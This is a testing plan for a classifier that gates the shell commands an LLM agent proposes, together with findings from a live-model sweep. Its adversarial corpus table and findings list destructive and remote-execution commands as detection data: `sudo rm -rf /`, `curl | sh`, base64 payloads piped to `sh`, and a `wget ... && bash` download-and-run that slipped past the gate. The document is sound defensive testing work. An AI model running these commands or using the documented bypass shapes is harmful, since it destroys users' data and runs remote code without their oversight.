## Overview

This is the rigorous testing plan for SynapseOS's execution engine (`internal/classifier`, `internal/executor`, `internal/undo`, and `cmd/synapse`'s orchestration loop), written in Session 22 in response to a real gap found by hand: `sed -i`, `tee`, and `truncate` all auto-ran without confirmation despite destroying file content with no undo. A fixed example list — including the one that found that gap — can never be exhaustive; this document is the plan for testing *categories of danger* and *the model's actual behavior*, not just today's known examples, and for doing it in a way that answers a specific question the current single-model setup can't: is a given failure a property of the *engine*, or a property of *this one 3B model*. Six layers are defined below, ordered cheapest/most-deterministic first. **All six are built as of Session 26** (`build-order.md` F3/F4/F5) — this document now doubles as the record of what each layer found, not just what it planned to test.

## Table of Contents

- [Overview](#overview)
- [Layer 1 — Deterministic Unit Correctness](#layer-1-deterministic-unit-correctness)
- [Layer 2 — Adversarial Classifier Corpus](#layer-2-adversarial-classifier-corpus)
- [Layer 3 — Model-Facing Integration Testing](#layer-3-model-facing-integration-testing)
- [Layer 4 — Typed-Operation Reliability Experiment](#layer-4-typed-operation-reliability-experiment)
- [Layer 5 — Executor Chaos/Edge-Case Testing](#layer-5-executor-chaosedge-case-testing)
- [Layer 6 — Regression Harness](#layer-6-regression-harness)
- [Model Parameterization — a Cross-Cutting Requirement](#model-parameterization-a-cross-cutting-requirement)

## Layer 1 — Deterministic Unit Correctness

**Status: built.** The orchestration mechanics themselves — does the loop actually gate on classification, respect the step cap, feed results back correctly, stop on `DONE` — are covered by `cmd/synapse/loop_test.go` (Session 21) and `internal/undo`'s own test suite (Session 22). `internal/classifier` and `internal/executor` are at 100% statement coverage. This layer answers "does the *code* do what it's supposed to," not "does the *model* behave safely" — that's Layers 2–4.

## Layer 2 — Adversarial Classifier Corpus

**Status: built (Session 23), extended twice since (D22, D25).** F1 closed four specific gaps found by hand. This layer replaced "specific gaps found by hand" with **a taxonomy of danger categories**, each with representative *and* adversarial variants, so the next gap is found by a systematic sweep rather than another live-testing accident. All seven categories below are covered by `TestClassifyAdversarialCorpus`, including the ones that read as open questions when this table was first written: privilege escalation (`sudo`/`su`) needed no separate inheritance mechanism — the existing patterns are unanchored word-boundary matches, so `sudo rm -rf /` already matches `\brm\b` regardless of the prefix, verified by dedicated adversarial cases rather than assumed; network exfiltration became **D22**'s fetch/decode-exec rules; obfuscation via command substitution became part of the dynamic-kill-target check. Disk/block-level destruction (`dd`/`mkfs`) was later extended past pure classification into undo coverage for the regular-file-target case (D25, F5) — a block-device target remains a documented, deliberate non-target for undo, not a classification gap.

| Category | Representative shape | Adversarial variants to test |
|---|---|---|
| Deletion | `rm`, `shred` | inside a pipeline (`\| xargs rm`), inside `find -exec`, via a variable (`$CMD file.txt` where `$CMD=rm`), obfuscated via `command rm` or `\rm` (shell escapes that bypass aliases but not the literal string) |
| In-place content mutation | `sed -i`, `awk -i`, `tee` | combined short flags (`-ai` for tee), flag order variations, chained with a safe command first (`cat file \| sed -i ...`) |
| Disk/block-level destruction | `dd`, `mkfs` | targeting a file path that happens to contain "dd" as a substring, `dd` inside a `sudo` wrapper |
| Permission/ownership changes | `chmod`, `chown` (not currently classified at all) | recursive flag (`-R`) as the actual risk signal, since a permission change alone isn't necessarily destructive but `chmod -R 000` on a live directory can be functionally as bad as deletion |
| Privilege escalation | `sudo`, `su` prefixing any other command | should probably inherit the *inner* command's classification, not its own — currently untested |
| Network exfiltration / remote execution | `curl \| sh`, `wget -O- \| bash` | these aren't filesystem-destructive but are a different, currently entirely unaddressed risk category — worth a decision (in scope for the classifier, or explicitly out of scope and documented as such) rather than silence |
| Obfuscation | base64-encoded payloads piped to `sh`/`eval`, command substitution (`` `...` ``/`$(...)`) hiding a dangerous inner command | tests whether the classifier's plain-string matching survives basic obfuscation, or whether obfuscation is an accepted blind spot that should be documented like the `cp` gap is |

**Method:** table-driven Go tests, same shape as the existing `classifier_test.go`, organized by category (sub-tests per category) so a future gap report can point at exactly which category needs a new row, not just "add another example." Golden-corpus discipline: every gap found from here forward — by hand, by fuzzing, or by Layer 3's live-model sweep — gets added here permanently, never fixed and forgotten.

**Optional stretch, not required to call this layer done:** property-based/fuzz testing (Go's built-in fuzzing, `go test -fuzz`) generating randomized combinations of safe and unsafe fragments, asserting an invariant rather than a fixed expected output — e.g. "any generated string containing an unquoted, non-commented `rm` token is never classified Reversible." Useful for catching combinatorial cases a human wouldn't think to write by hand, but the categorized table above is the load-bearing part of this layer.

## Layer 3 — Model-Facing Integration Testing

**Status: built (Session 23).** Every layer above tests the classifier against *hand-picked* strings. This layer tests it against what the model **actually proposes** in practice, which is a different and arguably more important question — the classifier only matters for commands the model actually generates.

**Method:** `cmd/synapse/live_integration_test.go` (`-tags live`) runs a 25-task categorized corpus through `propose` against a live model, and for every proposed command, runs it through `Classify` and records the verdict to a reviewable JSON report. This is *not* scoring correctness of the bash (that's the separate, already-deferred Intent Parsing Accuracy Evaluator in `scope.md`) — it's asking "of everything this model actually tends to output, does anything slip past the classifier that a human reviewer would flag as risky."

**Real findings, not just a clean pass:** the first live run against `qwen2.5-coder:3b` found a genuine gap — `wget https://example.com/setup.sh && bash setup.sh` (download-then-run, not piped) slipped past D22's original piped-only fetch-exec rule. Fixed the same session (`shellInterpreterInvocation` now requires proper token boundaries on both sides). A follow-up 3B-vs-7B matrix answered the standing "is this model-size-specific" question directly: 3B answered `UNSUPPORTED` on two tasks 7B handled correctly (a real capability gap, not a classifier gap), and no new classifier gaps appeared on the 7B pass.

## Layer 4 — Typed-Operation Reliability Experiment

**Status: built and run (Session 25)** — this is `build-order.md` F4, the specific empirical question behind "should SynapseOS reimplement filesystem-MCP-style typed operations." `cmd/synapse/layer4_test.go` (`-tags live`) ran the plan exactly as scoped:

1. Fixed task set: Layer 3's file-manipulation-category subset (5 tasks), against 3B and 7B.
2. Two paths: raw-bash-string + classifier, vs. a typed-operation path (`internal/typedops`: `find_files`/`move_files`/`delete_files`/`rename_files`/`copy_file`, dispatched through Go's own `os`/`io`, no MCP/Node) called via `internal/ollama.Chat`'s native tool-calling API, falling back to hand-parsed freeform JSON.
3. Scored on call-validity, task-success, and safety-classification agreement — see `internal/typedops`' `layer4_report.json` (gitignored, regenerated per run) for the raw per-task records.
4. **Real result:** native `tool_calls` never populated (0/20 across the full matrix) — Ollama's tool-calling API doesn't work for this model family, confirmed empirically rather than assumed from docs. Typed-op path (via the freeform-JSON fallback) hit 100%/100% call-validity/task-success on both models; raw-bash hit 100%/100% on 7B but only 80%/60% on 3B, including a real missing-system-dependency failure (`rename` not installed) the typed path structurally can't have. **Verdict: adopt typed operations for the bounded file-manipulation subset** — not a full rewrite, not "not worth it." `internal/typedops` exists but isn't wired into `runLoop`'s default path; that's separate, unscoped future work.

## Layer 5 — Executor Chaos/Edge-Case Testing

**Status: built (Session 23).** `internal/executor` was at 100% coverage for its *happy path and simple failure* cases (Session 21) but untested against the edge cases that show up once real, model-generated commands run against a real filesystem. All five below are now covered, and the first one was a real, confirmed bug, not a hypothetical:

- **A command that hangs indefinitely** — confirmed live: `runLoop` passed the outer, unbounded `ctx` straight through to `executor.Run`, so a hung command froze the whole process. **Fixed**: `stepExecutionTimeout` (120s) wraps each step's execution in its own deadline; `executor.Run` also gained `WaitDelay` (bounds pipe-drain time after a kill) and `Result.TimedOut`, since a kill signal alone doesn't guarantee prompt return if a killed process orphaned something holding stdout/stderr open.
- **A command producing gigabytes of stdout** — `TestRunHandlesLargeStdout`, verified no pathological memory behavior in the `bytes.Buffer`-based capture.
- **Non-UTF8/binary output** — `TestRunHandlesNonUTF8Output`, capture and prompt-feedback truncation both survive without corrupting the byte stream or crashing.
- **A command expecting stdin** — `TestRunDoesNotHangOnCommandExpectingStdin`, verified the documented `os/exec` default (no stdin attached means the child sees EOF immediately) rather than assumed.
- **Concurrent/overlapping runs** — `TestRunConcurrentOverlappingRuns`, relevant now that M3a's persistent loop is the next milestone. Verified under `-race` (Session 26, once `build-essential` was installed) with zero data races.

## Layer 6 — Regression Harness

**Status: built (Session 23).** Layers 1–2 are fast, deterministic, and run by default under `go test ./...`. Layers 3–5 need live infrastructure (a running Ollama server, possibly multiple pulled models) and must not slow down or break the default test run. **Method, as delivered:** every live-model-dependent test file carries `//go:build live` (`cmd/synapse/live_integration_test.go`, `cmd/synapse/layer4_test.go`), so `go test ./...` stays fast/deterministic by default and `go test -tags live ./...` runs the full suite including model-facing layers when a live Ollama server is available.

## Model Parameterization — a Cross-Cutting Requirement

Every layer that touches a live model must be **parameterized by model tag, never hardcoded** — this was flagged explicitly and is a hard requirement, not a nice-to-have: the whole point of Layer 3/4 is to be able to answer "is this a 3B-specific problem, or does it persist at 5B/7B" by re-running the *same* corpus against a different `SYNAPSE_MODEL` value with zero code changes. **Delivered**: `SYNAPSE_LIVE_MODELS` (comma-separated tags, both Layer 3 and Layer 4) runs the same task corpus against a configured list of models in sequence and logs a per-model comparative summary — this is exactly the mechanism that answered the 3B-vs-7B question for both layers, not a hypothetical capability.
